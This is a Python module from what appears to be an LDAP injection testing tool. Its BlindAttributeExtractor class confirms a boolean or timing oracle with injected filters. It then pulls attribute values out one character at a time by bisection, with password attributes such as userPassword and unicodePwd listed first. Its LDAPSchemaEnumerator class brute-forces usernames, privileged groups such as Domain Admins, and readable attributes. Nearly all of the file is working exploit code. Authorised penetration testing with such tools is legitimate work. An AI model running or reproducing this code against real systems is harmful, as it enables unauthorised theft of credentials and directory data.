import statistics
from typing import List, Dict, Optional, Tuple, Any, Set
from .models import Endpoint, Baseline, Payload, PayloadTier, Severity
from .detection import DetectionResult
from .client import HTTPClient
from .detection import DetectionPipeline
from .budget import AdaptiveBudgetManager
from .utils import build_injection_data, vprint, success, info, verbose

class BlindAttributeExtractor:
    _ATTR_PRIORITY = {
        "ad": ["sAMAccountName", "userPassword", "unicodePwd", "userPrincipalName", "mail", "memberOf", "description"],
        "openldap": ["uid", "userPassword", "cn", "mail", "sshPublicKey", "homeDirectory", "description"],
        "generic": ["uid", "cn", "userPassword", "mail", "description", "memberOf"],
    }
    def __init__(self, client: HTTPClient, pipeline: DetectionPipeline, budget: AdaptiveBudgetManager, cfg: Any):
        self._client = client; self._pipeline = pipeline; self._budget = budget; self._cfg = cfg; self._alphabet = " !#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"; self._timing_baseline_ms = None
    def confirm_oracle(self, ep: Endpoint, param: str, baseline: Baseline) -> bool:
        t_fired = 0
        for r in ["*(|(objectClass=*))", "*(cn=*)"]:
            if self._send_and_score(ep, param, Payload(r, "oracle-true", "bool_true", PayloadTier.TIER2_BOOLEAN), baseline).fired: t_fired += 1
        f_fired = 0
        for r in ["*(objectClass=\\00ZZZNEVER)", "*(cn=\\00\\ff\\fe\\00NEVER)"]:
            if self._send_and_score(ep, param, Payload(r, "oracle-false", "bool_false", PayloadTier.TIER2_BOOLEAN), baseline).fired: f_fired += 1
        return (t_fired >= 1 and f_fired == 0) or self._calibrate_timing_oracle(ep, param, baseline)
    def _calibrate_timing_oracle(self, ep: Endpoint, param: str, baseline: Baseline) -> bool:
        c_times = []; s_times = []
        for _ in range(7):
            if not self._budget.acquire_verification(): break
            r = self._client.send_endpoint(ep, build_injection_data(ep, param, "*(|(objectClass=*)(cn=*)(uid=*)(mail=*)(sAMAccountName=*))", self._cfg.deterministic_suffix), phase="verification")
            (c_times.append(r.elapsed.total_seconds()) if r else None)
        for _ in range(7):
            if not self._budget.acquire_verification(): break
            r = self._client.send_endpoint(ep, build_injection_data(ep, param, "*(objectClass=\\00ZZZNEVER)", self._cfg.deterministic_suffix), phase="verification")
            (s_times.append(r.elapsed.total_seconds()) if r else None)
        if len(c_times) < 4 or len(s_times) < 4: return False
        med_c = statistics.median(c_times); med_s = statistics.median(s_times)
        iqr_c = sorted(c_times)[3*len(c_times)//4] - sorted(c_times)[len(c_times)//4]
        iqr_s = sorted(s_times)[3*len(s_times)//4] - sorted(s_times)[len(s_times)//4]
        jitter = max(iqr_c, iqr_s, 0.05) * 2; delta = med_c - med_s
        if delta > 0 and jitter <= (delta * 0.5): self._timing_baseline_ms = med_s * 1000; return True
        return False
    def extract_all(self, ep: Endpoint, param: str, baseline: Baseline, schema_attrs: List[str]) -> Dict[str, str]:
        if getattr(self._cfg, "no_extract", False): return {}
        stype = getattr(self._cfg, "server_type", "generic"); ordered = list(dict.fromkeys(self._ATTR_PRIORITY.get(stype, self._ATTR_PRIORITY["generic"]) + schema_attrs))
        res = {}; total = 0; cap = self._cfg.extract_limit
        for a in ordered:
            if total >= cap or not self._attr_exists(ep, param, a, baseline): continue
            val = self.extract_attribute(ep, param, a, baseline)
            if val: res[a] = val; total += len(val); success(f"    Extracted [{a}]: {val!r}")
        return res
    def _attr_exists(self, ep: Endpoint, param: str, attr: str, baseline: Baseline) -> bool:
        if not self._budget.acquire_verification(): return False
        return self._send_and_score(ep, param, Payload(f"*({attr}=*)", f"exist-{attr}", "bool_enum", PayloadTier.TIER2_BOOLEAN), baseline).fired
    def extract_attribute(self, ep: Endpoint, param: str, attr: str, baseline: Baseline) -> str:
        use_timing = (self._timing_baseline_ms is not None); ext = ""
        for pos in range(1, self._cfg.extract_limit + 1):
            char = self._find_char_timing(ep, param, attr, pos, ext, baseline) if use_timing else self._find_char_boolean(ep, param, attr, pos, ext, baseline)
            if not char: break
            ext += char
        return ext
    def _find_char_boolean(self, ep: Endpoint, param: str, attr: str, pos: int, prefix: str, baseline: Baseline) -> str:
        lo, hi = 0, len(self._alphabet)
        while lo < hi:
            if not self._budget.acquire_verification(): return ""
            mid = (lo + hi) // 2
            if self._send_and_score(ep, param, Payload(f"*({attr}>={prefix}{self._alphabet[mid]})", "bisect", "bool_true", PayloadTier.TIER2_BOOLEAN), baseline).fired: lo = mid + 1
            else: hi = mid
        if lo == 0: return ""
        cand = self._alphabet[lo - 1]
        if self._send_and_score(ep, param, Payload(f"*({attr}={prefix}{cand}*)", "verify", "bool_true", PayloadTier.TIER2_BOOLEAN), baseline).fired: return cand
        for d in [-1, 1, -2, 2]:
            idx = (lo - 1) + d
            if 0 <= idx < len(self._alphabet) and self._send_and_score(ep, param, Payload(f"*({attr}={prefix}{self._alphabet[idx]}*)", "nb", "bool_true", PayloadTier.TIER2_BOOLEAN), baseline).fired: return self._alphabet[idx]
        return ""
    def _find_char_timing(self, ep: Endpoint, param: str, attr: str, pos: int, prefix: str, baseline: Baseline) -> str:
        lo, hi = 0, len(self._alphabet) - 1; thr = self._timing_baseline_ms or 100.0; jit = max(baseline.stddev * 1000, 30.0)
        while lo < hi:
            if not self._budget.acquire_verification(): break
            mid = (lo + hi) // 2; p = f"*(&({attr}>={prefix}{self._alphabet[mid]})({attr}<={prefix}{self._alphabet[mid+1 if mid+1<len(self._alphabet) else mid]}))"
            resp = self._client.send_endpoint(ep, build_injection_data(ep, param, p, self._cfg.deterministic_suffix), phase="verification")
            if resp and resp.elapsed.total_seconds() * 1000 > thr + jit: hi = mid
            else: lo = mid + 1
        return self._alphabet[lo] if lo < len(self._alphabet) else ""
    def _send_and_score(self, ep: Endpoint, param: str, pl: Payload, baseline: Baseline) -> DetectionResult:
        resp = self._client.send_endpoint(ep, build_injection_data(ep, param, pl.raw, self._cfg.deterministic_suffix), phase="verification")
        return self._pipeline.run(resp, baseline, pl) if resp else DetectionResult(False, 0.0, [], Severity.INFO, "")

class LDAPSchemaEnumerator:
    _USER_ATTRS_AD = ["sAMAccountName","userPrincipalName","displayName","mail","memberOf","userAccountControl","pwdLastSet","lastLogon","description","distinguishedName"]
    _USER_ATTRS_OL = ["uid","cn","mail","sn","givenName","uidNumber","gidNumber","homeDirectory","loginShell","shadowExpire","shadowLastChange","description","telephoneNumber"]
    _COMMON_USERNAMES = ["admin","administrator","root","service","ldap","guest","test","user","operator","backup","readonly","svc","system","support"]
    def __init__(self, client: HTTPClient, pipeline: DetectionPipeline, budget: AdaptiveBudgetManager, cfg: Any, extractor: BlindAttributeExtractor):
        self._client = client; self._pipeline = pipeline; self._budget = budget; self._cfg = cfg; self._extractor = extractor
    def _oracle(self, ep: Endpoint, param: str, filter_: str, baseline: Baseline) -> bool:
        resp = self._client.send_endpoint(ep, build_injection_data(ep, param, filter_, self._cfg.deterministic_suffix), phase="verification")
        return self._pipeline.run(resp, baseline, Payload(filter_, "enum", "bool_true", PayloadTier.TIER2_BOOLEAN)).fired if resp else False
    def enumerate_users(self, ep: Endpoint, param: str, baseline: Baseline, stype: str = "generic") -> List[str]:
        attr = "sAMAccountName" if stype == "ad" else "uid"; found = []; limit = getattr(self._cfg, "enum_max_users", 50); ulist = (self._cfg.enum_attrs if hasattr(self._cfg, "enum_attrs") else []) + self._COMMON_USERNAMES
        for u in ulist:
            if len(found) >= limit or not self._budget.acquire_verification(): break
            if self._oracle(ep, param, f"*({attr}={u})", baseline): found.append(u); info(f"    [Enum] User confirmed: {u!r}")
        return found
    def probe_attribute_acl(self, ep: Endpoint, param: str, baseline: Baseline, stype: str = "generic") -> Dict[str, bool]:
        attrs = self._USER_ATTRS_AD if stype == "ad" else self._USER_ATTRS_OL; res = {}
        for a in attrs:
            if not self._budget.acquire_verification(): break
            res[a] = self._oracle(ep, param, f"*({a}=*)", baseline)
        return res
    def enumerate_groups(self, ep: Endpoint, param: str, baseline: Baseline, stype: str = "generic") -> List[str]:
        found = []
        for g in ["Domain Admins","Domain Users","Enterprise Admins","Administrators","Schema Admins","Remote Desktop Users","admin","users","wheel","sudo","staff","developers","operations","security","it"]:
            if not self._budget.acquire_verification(): break
            if self._oracle(ep, param, f"*(cn={g})", baseline): found.append(g); info(f"    [Enum] Group confirmed: {g!r}")
        return found
    def run(self, ep: Endpoint, param: str, baseline: Baseline, stype: str = "generic") -> Dict[str, Any]:
        info(f"Post-confirm enumeration: {ep.url}:{param}"); res = {"users": [], "groups": [], "acl_map": {}, "extracted_values": {}}
        res["acl_map"] = self.probe_attribute_acl(ep, param, baseline, stype)
        res["users"] = self.enumerate_users(ep, param, baseline, stype)
        res["groups"] = self.enumerate_groups(ep, param, baseline, stype)
        readable = [a for a, r in res["acl_map"].items() if r]
        if readable and not getattr(self._cfg, "no_extract", False): res["extracted_values"] = self._extractor.extract_all(ep, param, baseline, readable[:6])
        return res
